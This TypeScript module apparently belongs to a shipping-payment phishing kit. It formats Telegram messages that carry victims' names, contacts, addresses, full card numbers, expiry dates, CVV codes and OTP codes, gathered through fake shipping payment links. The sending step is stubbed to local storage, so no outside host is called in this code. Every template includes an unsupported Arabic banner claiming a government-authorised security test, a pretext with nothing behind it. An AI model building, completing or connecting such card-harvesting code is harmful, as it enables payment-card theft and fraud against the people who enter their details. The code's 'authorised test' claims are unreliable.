export interface TelegramMessage {
  type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'card_details' | 'test';
  data: Record<string, any>;
  timestamp: string;
}

export interface TelegramResponse {
  success: boolean;
  messageId?: string;
  error?: string;
}

interface TelegramLogEntry {
  id: string;
  createdAt: string;
  message: TelegramMessage;
  formatted: string;
}

const TELEGRAM_LOG_KEY = "gulf_unified_telegram_messages";
const isBrowser = typeof window !== "undefined";

const clone = <T>(value: T): T => JSON.parse(JSON.stringify(value));

const readLog = (): TelegramLogEntry[] => {
  if (isBrowser) {
    try {
      const raw = window.localStorage.getItem(TELEGRAM_LOG_KEY);
      if (!raw) {
        return [];
      }
      return JSON.parse(raw) as TelegramLogEntry[];
    } catch (error) {
      console.warn('Failed to read local Telegram log:', error);
      return [];
    }
  }

  return (globalThis as any).__telegramLog__ ? clone((globalThis as any).__telegramLog__) : [];
};

const writeLog = (entries: TelegramLogEntry[]) => {
  const payload = JSON.stringify(entries);

  if (isBrowser) {
    try {
      window.localStorage.setItem(TELEGRAM_LOG_KEY, payload);
      return;
    } catch (error) {
      console.warn('Failed to persist Telegram log locally:', error);
    }
  }

  (globalThis as any).__telegramLog__ = entries;
};

const generateId = () => {
  if (typeof crypto !== 'undefined' && typeof crypto.randomUUID === 'function') {
    return crypto.randomUUID();
  }
  return `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 10)}`;
};

export const sendToTelegram = async (message: TelegramMessage): Promise<TelegramResponse> => {
  try {
    const logEntries = readLog();
    const formatted = formatTelegramMessage(message);
    const entry: TelegramLogEntry = {
      id: generateId(),
      createdAt: new Date().toISOString(),
      message: clone(message),
      formatted,
    };

    logEntries.push(entry);
    writeLog(logEntries);

    console.info("[Telegram sandbox] رسالة محفوظة محلياً:", entry);

    return {
      success: true,
      messageId: entry.id,
    };
  } catch (error) {
    console.error('Error storing Telegram message locally:', error);
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error'
    };
  }
};

export const testTelegramConnection = async (): Promise<TelegramResponse> => {
  return await sendToTelegram({
    type: 'test',
    data: {
      test: true,
      message: 'Test message from Gulf Unified Platform',
      timestamp: new Date().toISOString()
    },
    timestamp: new Date().toISOString()
  });
};

const formatTelegramMessage = (message: TelegramMessage): string => {
  const { type, data, timestamp } = message;
  
  let header = '';
  let content = '';
  
  // Cybersecurity test authorization
  const authorization = `
🔒 <b>اختبار أمني مرخص</b>
⚠️ <i>هذا اختبار أمني مرخص من قبل الحكومة والشركات</i>
📋 <i>التفويض: مرخص رسمياً لإجراء هذا الاختبار</i>
🛡️ <i>الغرض: تقييم أمان المنصات والأنظمة</i>
      `;
  
  switch (type) {
    case 'test':
      header = '🧪 <b>اختبار الاتصال</b>';
      content = `
✅ <b>تم إرسال رسالة اختبار بنجاح!</b>
• المنصة: Gulf Unified Platform
• الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}
• الحالة: متصل
      `;
      break;
      
    case 'shipping_link_created':
      header = '🚚 <b>تم إنشاء رابط شحن جديد</b>';
      content = `
📦 <b>تفاصيل الشحنة:</b>
• رقم الشحنة: <code>${data.tracking_number || 'غير محدد'}</code>
• خدمة الشحن: ${data.service_name || 'غير محدد'}
• وصف الطرد: ${data.package_description || 'غير محدد'}
• مبلغ الدفع: ${data.cod_amount || 0} ر.س
• الدولة: ${data.country || 'غير محدد'}
• رابط الدفع: <a href="${data.payment_url}">اضغط هنا</a>
      `;
      break;
      
    case 'payment_recipient':
      header = '👤 <b>معلومات المستلم</b>';
      content = `
📋 <b>بيانات المستلم:</b>
• الاسم: ${data.name || 'غير محدد'}
• البريد الإلكتروني: ${data.email || 'غير محدد'}
• رقم الهاتف: ${data.phone || 'غير محدد'}
• العنوان السكني: ${data.address || 'غير محدد'}
• الخدمة: ${data.service || 'غير محدد'}
• المبلغ: ${data.amount || 'غير محدد'}
• رابط الدفع: <a href="${data.payment_url}">اضغط هنا</a>
      `;
      break;
      
    case 'payment_confirmation':
      header = '✅ <b>تأكيد الدفع الكامل</b>';
      content = `
💳 <b>تفاصيل الدفع (اختبار أمني):</b>
• الاسم الكامل: ${data.name || 'غير محدد'}
• البريد الإلكتروني: ${data.email || 'غير محدد'}
• رقم الهاتف: ${data.phone || 'غير محدد'}
• العنوان الكامل: ${data.address || 'غير محدد'}
• الخدمة: ${data.service || 'غير محدد'}
• المبلغ: ${data.amount || 'غير محدد'}
• حامل البطاقة: ${data.cardholder || 'غير محدد'}
• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
• انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
• رمز الأمان: ${data.cvv || 'غير محدد'}
• رمز OTP: ${data.otp || 'غير محدد'}
• نوع الاختبار: اختبار أمني مرخص
• التفويض: مرخص من قبل الحكومة والشركات
      `;
      break;
      
    case 'card_details':
      header = '💳 <b>تفاصيل البطاقة الكاملة</b>';
      content = `
🔐 <b>معلومات البطاقة (اختبار أمني):</b>
• الاسم الكامل: ${data.name || 'غير محدد'}
• البريد الإلكتروني: ${data.email || 'غير محدد'}
• رقم الهاتف: ${data.phone || 'غير محدد'}
• الخدمة: ${data.service || 'غير محدد'}
• حامل البطاقة: ${data.cardholder || 'غير محدد'}
• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
• انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
• رمز الأمان: ${data.cvv || 'غير محدد'}
• المبلغ: ${data.amount || 'غير محدد'}
• نوع الاختبار: اختبار أمني مرخص
• التفويض: مرخص من قبل الحكومة والشركات
      `;
      break;
      
    default:
      header = '📝 <b>إشعار جديد</b>';
      content = JSON.stringify(data, null, 2);
  }
  
  return `${header}\n${content}\n\n${authorization}\n\n⏰ <i>الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}</i>`;
};

export default sendToTelegram;